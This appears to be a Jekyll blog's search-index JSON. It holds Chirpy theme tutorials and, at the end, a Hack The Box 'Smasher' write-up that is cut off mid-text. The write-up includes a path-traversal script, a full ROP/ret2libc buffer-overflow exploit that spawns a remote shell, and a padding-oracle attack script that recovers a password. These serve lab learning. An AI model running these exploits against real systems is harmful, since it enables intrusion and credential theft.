‚ïê‚ï£‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïùFile upload done.Updating service [default]...done.Setting traffic split for service [default]...done.Deployed service [default] to [https://chirpy-test-XXXX.ue.r.appspot.com]You can stream logs from the command line by running:$ gcloud app logs tail -s defaultTo view your application in the web browser run:$ gcloud app browse            Visit the deployed service. Add a /admin to the end of the URL.        Click on Authorize Users and make sure to add yourself as a managed user.        If you get any errors, please Google it. The errors are self-explanatory and should be easy to fix.  If everything went good, you‚Äôll get this screen:Create Google Analytics QueryHead to https://PROJECT_ID.REGION_ID.r.appspot.com/admin and create a query after verifying the account. GA Core Reporting API query request can be created in Query Explorer.The query parameters are as follows:  start-date: fill in the first day of blog posting  end-date: fill in today (this is a parameter supported by GA Report, which means that it will always end according to the current query date)  metrics: select ga:pageviews  dimensions: select ga:pagePathIn order to reduce the returned results and reduce the network bandwidth, we add custom filtering rules 1:      filters: fill in ga:pagePath=~^/posts/.*/$;ga:pagePath!@=.    Among them, ; means using logical AND to concatenate two rules.    If the site.baseurl is specified, change the first filtering rule to ga:pagePath=~^/BASE_URL/posts/.*/$, where BASE_URL is the value of site.baseurl.  After Run Query, copy the generated contents of API Query URI at the bottom of the page and fill in the Encoded URI for the query of SuperProxy on GAE.After the query is saved on GAE, a Public Endpoint (public access address) will be generated, and we will get the query result in JSON format when accessing it. Finally, click Enable Endpoint in Public Request Endpoint to make the query effective, and click Start Scheduling in Scheduling to start the scheduled task.Configure Chirpy to Display Page ViewOnce all the hard part is done, it is very easy to enable the Page View on Chirpy theme. Your superProxy dashboard should look something like below and you can grab the required values.Update the _config.yml file of Chirpy project with the values from your dashboard, to look similar to the following:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  pv:    proxy_endpoint: 'https://PROJECT_ID.REGION_ID.r.appspot.com/query?id=&lt;ID FROM SUPER PROXY&gt;'    cache_path:       # the local PV cache data, friendly to visitors from GFW regionNow, you should see the Page View enabled on your blog.Reference            Google Analytics Core Reporting API: Filters¬†&#8617;      "
  },
  
  {
    "title": "Customize the Favicon",
    "url": "/posts/customize-the-favicon/",
    "categories": "Blogging, Tutorial",
    "tags": "favicon",
    "date": "2019-08-11 00:34:00 +0800",
    





    
    "snippet": "The favicons of Chirpy are placed in the directory assets/img/favicons/. You may want to replace them with your own. The following sections will guide you to create and replace the default favicons...",
    "content": "The favicons of Chirpy are placed in the directory assets/img/favicons/. You may want to replace them with your own. The following sections will guide you to create and replace the default favicons.Generate the faviconPrepare a square image (PNG, JPG, or SVG) with a size of 512x512 or more, and then go to the online tool Real Favicon Generator and click the button Select your Favicon image to upload your image file.In the next step, the webpage will show all usage scenarios. You can keep the default options, scroll to the bottom of the page, and click the button Generate your Favicons and HTML code to generate the favicon.Download &amp; ReplaceDownload the generated package, unzip and delete the following two from the extracted files:  browserconfig.xml  site.webmanifestAnd then copy the remaining image files (.PNG and .ICO) to cover the original files in the directory assets/img/favicons/ of your Jekyll site. If your Jekyll site doesn‚Äôt have this directory yet, just create one.The following table will help you understand the changes to the favicon files:            File(s)      From Online Tool      From Chirpy                  *.PNG      ‚úì      ‚úó              *.ICO      ‚úì      ‚úó        ‚úì means keep, ‚úó means delete.The next time you build the site, the favicon will be replaced with a customized edition."
  },
  
  {
    "title": "Writing a New Post",
    "url": "/posts/write-a-new-post/",
    "categories": "Blogging, Tutorial",
    "tags": "writing",
    "date": "2019-08-08 14:10:00 +0800",
    





    
    "snippet": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be...",
    "content": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be set.Naming and PathCreate a new file named YYYY-MM-DD-TITLE.EXTENSION and put it in the _posts of the root directory. Please note that the EXTENSION must be one of md and markdown. If you want to save time of creating files, please consider using the plugin Jekyll-Compose to accomplish this.Front MatterBasically, you need to fill the Front Matter as below at the top of the post:---title: TITLEdate: YYYY-MM-DD HH:MM:SS +/-TTTTcategories: [TOP_CATEGORIE, SUB_CATEGORIE]tags: [TAG]     # TAG names should always be lowercase---  The posts‚Äô layout has been set to post by default, so there is no need to add the variable layout in the Front Matter block.Timezone of DateIn order to accurately record the release date of a post, you should not only set up the timezone of _config.yml but also provide the post‚Äôs timezone in variable date of its Front Matter block. Format: +/-TTTT, e.g. +0800.Categories and TagsThe categories of each post are designed to contain up to two elements, and the number of elements in tags can be zero to infinity. For instance:---categories: [Animal, Insect]tags: [bee]---Author InformationThe author information of the post usually does not need to be filled in the Front Matter , they will be obtained from variables social.name and the first entry of social.links of the configuration file by default. But you can also override it as follows:Adding author information in _data/authors.yml (If your website doesn‚Äôt have this file, don‚Äôt hesitate to create one).&lt;author_id&gt;:  name: &lt;full name&gt;  twitter: &lt;twitter_of_author&gt;  url: &lt;homepage_of_author&gt;And then use author to specify a single entry or authors to specify multiple entries:---author: &lt;author_id&gt;                     # for single entry# orauthors: [&lt;author1_id&gt;, &lt;author2_id&gt;]   # for multiple entries---Having said that, the key author can also identify multiple entries.  The benefit of reading the author information from the file _data/authors.yml is that the page will have the meta tag twitter:creator, which enriches the Twitter Cards and is good for SEO.Table of ContentsBy default, the Table of Contents (TOC) is displayed on the right panel of the post. If you want to turn it off globally, go to _config.yml and set the value of variable toc to false. If you want to turn off TOC for a specific post, add the following to the post‚Äôs Front Matter:---toc: false---CommentsThe global switch of comments is defined by variable comments.active in the file _config.yml. After selecting a comment system for this variable, comments will be turned on for all posts.If you want to close the comment for a specific post, add the following to the Front Matter of the post:---comments: false---MathematicsFor website performance reasons, the mathematical feature won‚Äôt be loaded by default. But it can be enabled by:---math: true---MermaidMermaid is a great diagrams generation tool. To enable it on your post, add the following to the YAML block:---mermaid: true---Then you can use it like other markdown languages: surround the graph code with ```mermaid and ```.ImagesCaptionAdd italics to the next line of an imageÔºåthen it will become the caption and appear at the bottom of the image:![img-description](/path/to/image)_Image Caption_SizeIn order to prevent the page content layout from shifting when the image is loaded, we should set the width and height for each image:![Desktop View](/assets/img/sample/mockup.png){: width=\"700\" height=\"400\" }Starting from Chirpy v5.0.0, height and width support abbreviations (height ‚Üí h, width ‚Üí w). The following example has the same effect as the above:![Desktop View](/assets/img/sample/mockup.png){: w=\"700\" h=\"400\" }PositionBy default, the image is centered, but you can specify the position by using one of the classes normal, left, and right.  Once the position is specified, the image caption should not be added.      Normal position    Image will be left aligned in below sample:    ![Desktop View](/assets/img/sample/mockup.png){: .normal }            Float to the left    ![Desktop View](/assets/img/sample/mockup.png){: .left }            Float to the right    ![Desktop View](/assets/img/sample/mockup.png){: .right }      ShadowThe screenshots of the program window can be considered to show the shadow effect, and the shadow will be visible in the light mode:![Desktop View](/assets/img/sample/mockup.png){: .shadow }CDN URLIf you host the images on the CDN, you can save the time of repeatedly writing the CDN URL by assigning the variable img_cdn of _config.yml file:img_cdn: https://cdn.comOnce img_cdn is assigned, the CDN URL will be added to the path of all images (images of site avatar and posts) starting with /.For instance, when using images:![The flower](/path/to/flower.png)The parsing result will automatically add the CDN prefix https://cdn.com before the image path:&lt;img src=\"https://cdn.com/path/to/flower.png\" alt=\"The flower\"&gt;Image PathWhen a post contains many images, it will be a time-consuming task to repeatedly define the path of the images. To solve this, we can define this path in the YAML block of the post:---img_path: /img/path/---And then, the image source of Markdown can write the file name directly:![The flower](flower.png)The output will be:&lt;img src=\"/img/path/flower.png\" alt=\"The flower\"&gt;Preview ImageIf you want to add an image to the top of the post contents, specify the attribute path, width, height, and alt for the image:---image:  path: /path/to/image  width: 1000   # in pixels  height: 400   # in pixels  alt: image alternative text---Except for alt, all other options are necessary, especially the width and height, which are related to user experience and web page loading performance. The above section ‚ÄúSize‚Äù also mentions this.Starting from Chirpy v5.0.0, the attributes height and width can be abbreviated: height ‚Üí h, width ‚Üí w. In addition, the img_path can also be passed to the preview image, that is, when it has been set, the  attribute path only needs the image file name.For simple use, you can also just use image to define the path.image: /path/to/imagePinned PostsYou can pin one or more posts to the top of the home page, and the fixed posts are sorted in reverse order according to their release date. Enable by:---pin: true---PromptsThere are several types of prompts: tip, info, warning, and danger. They can be generated by adding the class prompt-{type} to the blockquote. For example, define a prompt of type info as follows:&gt; Example line for prompt.{: .prompt-info }SyntaxInline Code`inline code part`Filepath Hightlight`/path/to/a/file.extend`{: .filepath}Code BlockMarkdown symbols ``` can easily create a code block as follows:```This is a plaintext code snippet.```Specifying LanguageUsing ```{language} you will get a code block with syntax highlight:```yamlkey: value```  The Jekyll tag {% highlight %} is not compatible with this theme.Line NumberBy default, all languages except plaintext, console, and terminal will display line numbers. When you want to hide the line number of a code block, add the class nolineno to it:```shellecho 'No more line numbers!'```{: .nolineno }Specifying the FilenameYou may have noticed that the code language will be displayed at the top of the code block. If you want to replace it with the file name, you can add the attribute file to achieve this:```shell# content```{: file=\"path/to/file\" }Liquid CodesIf you want to display the Liquid snippet, surround the liquid code with {% raw %} and {% endraw %}:{% raw %}```liquid{% if product.title contains 'Pack' %}  This product's title contains the word Pack.{% endif %}```{% endraw %}Or adding render_with_liquid: false (Requires Jekyll 4.0 or higher) to the post‚Äôs YAML block.Learn MoreFor more knowledge about Jekyll posts, visit the Jekyll Docs: Posts."
  },
  
  {
    "title": "Text and Typography",
    "url": "/posts/text-and-typography/",
    "categories": "Blogging, Demo",
    "tags": "typography",
    "date": "2019-08-08 11:33:00 +0800",
    





    
    "snippet": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let‚Äôs start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 ...",
    "content": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let‚Äôs start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 - headingParagraphQuisque egestas convallis ipsum, ut sollicitudin risus tincidunt a. Maecenas interdum malesuada egestas. Duis consectetur porta risus, sit amet vulputate urna facilisis ac. Phasellus semper dui non purus ultrices sodales. Aliquam ante lorem, ornare a feugiat ac, finibus nec mauris. Vivamus ut tristique nisi. Sed vel leo vulputate, efficitur risus non, posuere mi. Nullam tincidunt bibendum rutrum. Proin commodo ornare sapien. Vivamus interdum diam sed sapien blandit, sit amet aliquam risus mattis. Nullam arcu turpis, mollis quis laoreet at, placerat id nibh. Suspendisse venenatis eros eros.ListsOrdered list  Firstly  Secondly  ThirdlyUnordered list  Chapter          Section                  Paragraph                    ToDo list  Job          Step 1      Step 2      Step 3      Description list  Sun  the star around which the earth orbits  Moon  the natural satellite of the earth, visible by reflected light from the sunBlock Quote  This line shows the block quote.Prompts  An example showing the tip type prompt.  An example showing the info type prompt.  An example showing the warning type prompt.  An example showing the danger type prompt.Tables            Company      Contact      Country                  Alfreds Futterkiste      Maria Anders      Germany              Island Trading      Helen Bennett      UK              Magazzini Alimentari Riuniti      Giovanni Rovelli      Italy      Linkshttp://127.0.0.1:4000FootnoteClick the hook will locate the footnote1, and here is another footnote2.Images  Default (with caption)Full screen width and center alignment  Shadowshadow effect (visible in light mode)  Left aligned      Float to left    Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum. Phasellus a tortor aliquam, tristique felis sit amet, elementum enim. Integer vestibulum vitae nulla nec pretium.        Float to right    Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum. Phasellus a tortor aliquam, tristique felis sit amet, elementum enim. Integer vestibulum vitae nulla nec pretium.  Mermaid SVG gantt  title  Adding GANTT diagram functionality to mermaid  apple :a, 2017-07-20, 1w  banana :crit, b, 2017-07-23, 1d  cherry :active, c, after b a, 1dMathematicsThe mathematics powered by MathJax:\\[\\sum_{n=1}^\\infty 1/n^2 = \\frac{\\pi^2}{6}\\]When $a \\ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are\\[x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}\\]Inline codeThis is an example of Inline Code.FilepathHere is the /path/to/the/file.extend.Code blockCommonThis is a common code snippet, without syntax highlight and line number.Specific LanguagesConsole$ env |grep SHELLSHELL=/usr/local/bin/bashPYENV_SHELL=bashShellif [ $? -ne 0 ]; then    echo \"The command was not successful.\";    #do the needful / exitfi;Specific filename@import  \"colors/light-typography\",  \"colors/dark-typography\"Reverse Footnote            The footnote source¬†&#8617;              The 2nd footnote source¬†&#8617;      "
  },
  
  {
    "title": "Smasher - Hack The Box",
    "url": "/posts/htb-writeup-smasher/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, binary exploit",
    "date": "2018-11-24 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.89This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.Summary  The webserver used is vulnerable to a path traversal bug and buffer overflow in the...",
    "content": "Linux / 10.10.10.89This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.Summary  The webserver used is vulnerable to a path traversal bug and buffer overflow in the GET parameter  By using the path traversal bug we can get the Makefile and copy of the webserver executable  The buffer overflow can be solved by leaking libc‚Äôs base address and then building a ropchain to ret2libc  To gain user, we have to solve an Oracle padding challenge that gives us the user password  Priv esc is a race condition in a suid root ELF binary, we can swap out the file with a symlink to /root/root.txt to get the root flagTools used  pwntools  https://libc.blukat.me/  https://github.com/twd2/padding-oracle-attack/blob/master/attack.pyNmapQuick port scan reveals a webserver running on a non standard port 1111.root@kali:~/hackthebox# nmap -sC -sV 10.10.10.89Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-11 20:09 EDTNmap scan report for 10.10.10.89Host is up (0.017s latency).Not shown: 998 closed portsPORT     STATE SERVICE         VERSION22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)|   256 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)|_  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)1111/tcp open  lmsocialserver?| fingerprint-strings: |   FourOhFourRequest, GenericLines, SIPOptions: |     HTTP/1.1 404 Not found|     Server: shenfeng tiny-web-server|     Content-length: 14|     File not found|   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.1 200 OK|     Server: shenfeng tiny-web-server|     Content-Type: text/html|     &lt;html&gt;&lt;head&gt;&lt;style&gt;body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;|     &lt;tr&gt;&lt;td&gt;&lt;a href=\"index.html\"&gt;index.html&lt;/a&gt;&lt;/td&gt;&lt;td&gt;2018-03-31 00:57&lt;/td&gt;&lt;td&gt;2.1K&lt;/td&gt;&lt;/tr&gt;|_    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;Web serviceBased on the banner, we know the website is running using the tiny-web-server server application.There‚Äôs already an issue documented for this application about a path traversal vulnerability.We can walk the file system by doing a GET ../../../../&lt;file&gt;, and it also works for directories so we can get a directory listing.I wrote a small python script to fix the output and sort the results to make it easier to work with:#!/usr/bin/pythonfrom pwn import *import sysimport requestscontext.log_level = 'info'ls = []r = requests.get('http://10.10.10.89:1111/../../../../../%s' % (sys.argv[1]))if '&lt;tr&gt;' in r.text:    for line in r.text.splitlines():        if '&lt;tr&gt;' in line:            # print(line.split('\"')[1])            ls.append(line.split('\"')[1])    for i in (sorted(ls)):        print(i)else:    print r.textWe find the list of users in /etc/passwdroot@kali:~/hackthebox/Machines/Smasher# python scanner.py /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falsemessagebus:x:106:110::/var/run/dbus:/bin/falseuuidd:x:107:111::/run/uuidd:/bin/falsesshd:x:108:65534::/var/run/sshd:/usr/sbin/nologinwww:x:1000:1000:www,,,:/home/www:/bin/bashsmasher:x:1001:1001:,,,:/home/smasher:/bin/bashwww and smasher home directories are probably where we want to look next:We can‚Äôt read the home directory of smasher:root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/smasherFile not foundBut we can read what‚Äôs in www:root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www.bash_logout.bashrc.cache/.profile.python_history.ssh/restart.shtiny-web-server/Inside the web server directory, we can see that the Makefile has been modified to disable the stack protector and DEP/NX. This is our hint that we are probably looking at a buffer overflow exploit to get user access on this machine.root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server.git/MakefileREADME.mdpublic_html/tinytiny.croot@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server/MakefileCC = c99CFLAGS = -Wall -O2# LIB = -lpthreadall: tinytiny: tiny.c    $(CC) $(CFLAGS) -g -fno-stack-protector -z execstack -o tiny tiny.c $(LIB)clean:    rm -f *.o tiny *~Next, we‚Äôll grab the binary file and check if it‚Äôs compiled with additional protections:oot@kali:~/hackthebox/Machines/Smasher# nc -nv 10.10.10.89 1111 &gt; tiny(UNKNOWN) [10.10.10.89] 1111 (?) openGET ../../../../home/www/tiny-web-server/tinyWe edit the file with vi and strip the HTTP headers, then we get a clean ELF file:root@kali:~/hackthebox/Machines/Smasher# file tinytiny: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b872377623aa9e081bc7d72c8dbe882f03bf66b7, with debug_info, not strippedroot@kali:~/hackthebox/Machines/Smasher# checksec tiny[*] '/root/hackthebox/Machines/Smasher/tiny'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE    FORTIFY:  EnabledBuffer overflowThere‚Äôs an overflow in the GET parameter: if we send more than 568 characters in the GET request it‚Äôll crash. Because we have the binary and we can look around the file system we can:  Check the PLT/GOT offsets in the binary  Determine the libc version running on the target systemTo find the libc base address, we‚Äôll construct a rop chain and use the read function already present in the PLT. By chance, the RDX register is already set to a large value so we don‚Äôt need to find a gadget to mess with it. The binary contains POP RDI and POP RSI gadgets so we can pass the right parameters to the read function and dump a chunk of memory.Calculating the libc address is a matter of fetching the read address from the GOT, then substracting its offset (which we know because we have the libc version). After, we‚Äôll calculate the memory address for system, dup2 and the /bin/sh string.We need to build a ROP chain that calls dup2 first so we can redirect stdin and stdout to the socket.The final exploit is:#!/usr/bin/pythonfrom pwn import *import urllibimport sysr = remote('10.10.10.89', 1111)fd = 4offset = 568junk = p64(0xAABBAABBAABBAABB)plt_read = p64(0x400cf0)plt_write = p64(0x400c50)poprdi = p64(0x4011dd)poprsi = p64(0x4011db)payload_stage1 = ''payload_stage1 += 'A' * offsetpayload_stage1 += poprdi + p64(fd)payload_stage1 += poprsi + p64(0x603088) + junkpayload_stage1 += plt_writer.send('GET /%s\\n\\n' % urllib.quote(payload_stage1))buf = r.recv().split('File not found')[1][0:8]read_addr = u64(buf)libc_base = read_addr - 0xf7250    # https://libc.blukat.me/?q=_rtld_global%3A0&amp;l=libc6_2.23-0ubuntu10_amd64system_addr = libc_base + 0x45390str_bin_sh = libc_base + 0x18cd57dup2 = libc_base + 0xf7970log.info('libc base address is: %s' % hex(libc_base))log.info('read address is : %s' % hex(read_addr))log.info('system address is: %s' % hex(system_addr))log.info('dup2 address is: %s' % hex(dup2))log.info('/bin/sh address is: %s' % hex(str_bin_sh))r2 = remote('10.10.10.89', 1111)payload_stage2 = ''payload_stage2 += 'A' * offsetpayload_stage2 += poprdi + p64(fd)payload_stage2 += poprsi + p64(0x0) + junkpayload_stage2 += p64(dup2)payload_stage2 += poprdi + p64(fd)payload_stage2 += poprsi + p64(0x1) + junkpayload_stage2 += p64(dup2)payload_stage2 += poprdi + p64(str_bin_sh)payload_stage2 += p64(system_addr)r2.send('GET /%s\\n\\n' % urllib.quote(payload_stage2))r2.recvuntil('File not found')r2.interactive()The exploit in action:root@kali:~/hackthebox/Machines/Smasher# python exploit.py [+] Opening connection to 10.10.10.89 on port 1111: Done[*] libc base address is: 0x7f561f10e000[*] read address is : 0x7f561f205250[*] system address is: 0x7f561f153390[*] dup2 address is: 0x7f561f205970[*] /bin/sh address is: 0x7f561f29ad57[+] Opening connection to 10.10.10.89 on port 1111: Done[*] Switching to interactive mode$ iduid=1000(www) gid=1000(www) groups=1000(www)After getting that shell, we can add our SSH public key to /home/www/.ssh/authorized_keys so we can log in directly without using the exploit.root@kali:~# ssh www@10.10.10.89Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Tue Jun 12 01:34:47 2018 from 10.10.14.23Oracle paddingThere‚Äôs a hidden service runnning on port 1337 which prompts for a ciphertext string:www@smasher:~$ netstat -panut |more(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:1111            0.0.0.0:*               LISTEN      29166/tiny      tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -               tcp        0      0 0.0.0.0:1338            0.0.0.0:*               LISTEN      8562/socat      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - www@smasher:~$ nc 127.0.0.1 1337[*] Welcome to AES Checker! (type 'exit' to quit)[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==Insert ciphertext: testGeneric error, ignore me!This looks like a challenge which can be solved through an Oracle Padding attack.To solve this we‚Äôll modify the following script: https://github.com/twd2/padding-oracle-attack/blob/master/attack.pyNote: latest version of pwntools needs to be installed for Python3 in order for this to work: pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.gitimport sysimport timeimport urllibimport urllib.parseimport urllib.requestimport randomimport argparseimport binasciifrom pwn import *import base64def api(data):  print(data)  r = remote(\"10.10.10.89\",1338,level='warn')  r.recvuntil(\"Insert ciphertext: \")  r.sendline(base64.b64encode(binascii.unhexlify(data)))  print(base64.b64encode(binascii.unhexlify(data)))  tmp = r.recvuntil('Insert ciphertext:').decode(\"utf-8\")  r.close()  if 'OK!' in tmp:    return True  if 'Invalid' in tmp:    return Falsedef is_valid(iv, c):  # Test if the padding of (iv ^ c^(-1)) is valid.  data = binascii.hexlify(bytearray(iv)).decode() + binascii.hexlify(bytearray(c)).decode()  # print(data)  return api(data)def attack(data, block_id, is_valid):  if 16 * block_id + 32 &gt; len(data):    print('Block id is too large.')    exit(1)  c_p = list(data[16 * block_id:16 * block_id + 16]) # Previous cipher block  iv = [random.choice(range(256)) for i in range(0, 16)] # *Random* initialization vector is necessary.  c = data[16 * block_id + 16:16 * block_id + 32] # Current cipher block    plain = []  for n in range(1, 17): # Which byte (in reverse order)?    for i in range(0, 256): # All possibilities of iv[-n]      iv[-n] = i      if is_valid(iv, c): # Padding is valid, so (iv[-n] ^ c^(-1)[-n]) is n, (iv[-n] ^ n) is c^(-1)[-n].        break    # print(iv[-n] ^ n ^ c_p[-n], chr(iv[-n] ^ n ^ c_p[-n]))     # Calculate plain text.    # Note: (iv[-n] ^ n) is c^(-1)[-n], so ((iv[-n] ^ n) ^ c_p[-n]) == (c^(-1)[-n] ^ c_p[-n]) is (plain text)[-n].    plain.append(iv[-n] ^ n ^ c_p[-n])    for i in range(1, n + 1):      iv[-i] = iv[-i] ^ n ^ (n + 1)      # Note:      # For futher attack,      # For i in [1, n], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1), so that we can attack c^(-1)[-(n + 1)] using padding oracle.      # In particular, for i == n, we want (new iv[-n] ^ c^(-1)[-n]) to be (n + 1), so new iv[-n] should be (c^(-1)[-n] ^ (n + 1)) == ((iv[-n] ^ n) ^ (n + 1)).      # In particular, for i in [1, n - 1], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1). Please note that (iv[-i] ^ c^(-1)[-i]) is n, so new iv[-i] should be (c^(-1)[-i] ^ (n + 1)) == ((iv[-i] ^ n) ^ (n + 1))  plain.reverse()  return bytearray(plain)def main():  # Data from http://10.60.0.212:5757/generate  #data_hex = '74b6510402f53b1661b98a2cfee1f1b5d65753e5ca0ccb1356c0ef871a0118bc47c245dcb51dc51efd473e5f63f3a8c94818195d08d01e740f27d07b0893d0cd'  data_hex = '8ab466581ee825231bb410b842ea01d770c2d3c348d3a31b71610e73de2ad0e5cf6df8119be97dc4790f43bafb35d163a3a852a3ab6882a2d8213186a4fb1776'  data = binascii.unhexlify(data_hex)  for i in range(0, 3):    print(attack(data, i, is_valid).decode(), end='')if __name__ == '__main__':  main()We can redirect to the local 1337 port using socat: socat tcp-listen:1338,reuseaddr,fork tcp:localhost:1337Then we‚Äôll launch the script against port 1338 and let it run for a bit:python3 oracler.py &gt; oracler_output.txtA few lines stand out in the output:b'utEFLXzYEkBmxXPAN4g253DC08NI06MbcWEOc94q0OU=' user 'smasher' 42eb200bed0f389985bbe43762f1ba00cf6df8119be97dc4790f43bafb35d163b'CaH58wii128IH3ksvFujmc9t+BGb6X3EeQ9Duvs10WM='is: PaddingOraclde1ffb8adbdc35ac24caa42050f32100a3a852a3ab6882a2d8213186a4fb1776b'ujCJcv+cH+VbLFWs7SPHdaOoUqOraIKi2CExhqT7F3Y='eMaster123\\x06\\x06\\x06\\x06\\x06\\x06rBy putting this back together we get: user 'smasher' is: PaddingOracleMaster123We can log in with that user and get the first flag:root@kali:~# ssh smasher@10.10.10.89smasher@10.10.10.89's password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Tue Jun 12 01:24:51 2018 from 10.10.16.9smasher@smasher:~$ iduid=1001(smasher) gid=1001(smasher) groups=1001(smasher)smasher@smasher:~$ lscrackme.py  socat.sh  user.txtsmasher@smasher:~$ cat user.txtbaabc&lt;redacted&gt;PrivescThere‚Äôs a SUID file that‚Äôs interesting:smasher@smasher:~$ find / -perm /6000 2&gt;/dev/null/usr/bin/checkersmasher@smasher:~$ checker[+] Welcome to file UID checker 0.1 by dzonerzyMissing argumentssmasher@smasher:~$ file /usr/bin/checker/usr/bin/checker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=33890d7446199d25dadc438fce63a78c3f377f95, not strippedThere‚Äôs a race condition in the file because it sleeps for 1 second before reading the file content, so we can exploit this by:  Creating a dummy file ‚Äòblah‚Äô with some junk it 